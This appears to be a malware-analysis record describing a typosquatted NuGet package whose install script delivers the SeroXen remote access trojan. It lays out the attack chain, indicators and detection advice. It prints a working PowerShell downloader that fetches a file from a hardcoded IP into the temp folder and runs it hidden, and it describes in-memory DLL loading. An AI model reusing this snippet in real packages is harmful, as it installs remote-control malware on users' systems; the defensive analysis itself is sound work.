package_info.why_malicious: The package is a typosquat of a legitimate package and contains malicious install scripts that download, decrypt, and execute the SeroXen RAT, a remote access trojan. The package abuses NuGet's install-time scripting to covertly deploy malware, and all versions are designed to deliver this payload.

malicious_snippets.code_snippet:
$a = "<http://66.23.238.220/assets/images/icons/svg/x.bin>"
$y = "$env:temp\xxxxx.cmd"
$sleepTheGodFilePath = Join-Path $env:LocalAppData "Temp\SleepTheGod"
if (-not (Test-Path $sleepTheGodFilePath)) {
    New-Item -ItemType File -Path $sleepTheGodFilePath -Force | Out-Null
    Invoke-WebRequest -Uri $a -OutFile $y -ErrorAction SilentlyContinue | Out-Null
    Start-Process "cmd" "/c $y" -WindowStyle Hidden
}
malicious_snippets.code_behavior: At install-time, the script checks for a marker file, downloads an obfuscated batch file from a remote server, writes it to the temp directory, and silently executes it via cmd.exe, enabling covert malware delivery.

malice_analysis.why_suspicious: The script downloads and executes a remote file during package installation, a classic malware delivery technique.
malice_analysis.violated_expectations: Legitimate NuGet packages rarely, if ever, download and execute remote code during installation. Expected behavior is limited to setup or configuration, not arbitrary code execution.
malice_analysis.similar_legitimate_use: Some legitimate packages may download dependencies or tools, but not from suspicious, hardcoded IPs, nor execute them silently.
key_indicators: Creation of marker file to avoid repeated execution
Use of -WindowStyle Hidden to evade user notice

execution_context.file_location: Downloaded as x.bin (batch file) in temp directory

malicious_snippets.code_behavior: At install-time, the obfuscated batch script reconstructs and executes a PowerShell script that decrypts, decompresses, and loads two embedded DLLs (SeroXen RAT payloads) into memory for execution.

malice_analysis.why_suspicious: The batch file is highly obfuscated, uses undefined variables, and reconstructs commands at runtime to evade detection and analysis.
malice_analysis.violated_expectations: Batch files in legitimate packages are not expected to contain extreme obfuscation or to reconstruct and execute further scripts for in-memory malware deployment.
malice_analysis.similar_legitimate_use: Obfuscation may be used in DRM or proprietary installers, but not to this degree or for the purpose of hiding malware.

execution_context.file_location: Reconstructed and executed in-memory PowerShell script

malicious_snippets.code_behavior: At install-time, the PowerShell script decrypts and decompresses two embedded DLLs from the batch file, then loads and executes them in-memory, resulting in the deployment of the SeroXen RAT.

malice_analysis.why_suspicious: The script performs in-memory decryption and execution of DLLs, a hallmark of fileless malware and advanced evasion.
malice_analysis.violated_expectations: Legitimate install scripts do not decrypt and execute arbitrary DLLs from obfuscated sources in-memory.
malice_analysis.similar_legitimate_use: In-memory execution may be used in advanced legitimate updaters or packers, but not for arbitrary, untrusted payloads.
key_indicators: AES decryption and GZip decompression of embedded payloads
Extraction of payloads from obfuscated batch script

attack_chain.action: During NuGet package installation, a PowerShell script is executed that checks for a marker file, downloads an obfuscated batch file from a remote server, and executes it silently.
attack_chain.leads_to: Execution of the obfuscated batch file (x.bin)

attack_chain.action: The obfuscated batch file reconstructs and executes a PowerShell script that extracts, decrypts, and decompresses embedded payloads.
attack_chain.leads_to: In-memory execution of the PowerShell loader

attack_chain.action: The PowerShell loader script decrypts and decompresses two DLLs (SeroXen RAT payloads) and loads them into memory for execution.
attack_chain.leads_to: Active deployment of SeroXen RAT on the victim system

behavioral_signatures: NuGet install scripts (init.ps1/install.ps1/uninstall.ps1) that download and execute remote files
Obfuscated batch files that reconstruct and execute PowerShell scripts
In-memory decryption and execution of DLL payloads during package installation
file_indicators: Downloaded batch file named xxxxx.cmd in %TEMP%
Downloaded file x.bin in svg/ directory
detection_knowledge.how_to_detect: Monitor NuGet package installations for execution of install/uninstall/init.ps1 scripts that perform network downloads, especially from hardcoded IP addresses. Flag packages that download and execute files in the temp directory, or that use obfuscated batch scripts to launch PowerShell. Detect in-memory assembly loading and execution of DLLs during package installation. Correlate with known malicious IPs and file hashes (e.g., x.bin, payload.exe).
